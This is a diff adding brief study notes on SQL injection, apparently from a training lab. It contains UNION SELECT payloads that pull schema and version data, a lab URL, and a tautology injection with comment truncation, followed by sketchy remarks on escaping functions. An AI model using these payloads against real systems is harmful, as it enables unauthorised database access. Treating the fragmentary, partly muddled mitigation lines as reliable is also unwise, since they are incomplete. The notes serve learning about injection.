@@ -1,0 +1,31 @@
+Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
+
+Though they may allow for nesting a statement within an existing one:
+
+php?key=<value>UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
+
+example
+
+http://10.50.33.78/uniondemo.php?Selection
+
+where name = 'Luke_Skywalker'
+
+Using # or -- tells the Database to ignore everything after
+
+Server-Side Query:
+
+SELECT product FROM item WHERE id = $select limit 1;
+
+Input to Inject: 1 OR 1=1; #
+
+Server-Side Query becomes: 
+SELECT product FROM item WHERE id = 1 or 1=1; # 
+limit 1;
+
+prices.php?item=4 UNION SELECT 1,2,@@version
+
+Methods differ depending on software
+CONCATENATE : turns inputs into single strings or escape characters
+
+PHP: MYSQL_REAL_ESCAPE_STRING
+SQL: SQLITE3_PREPARE()
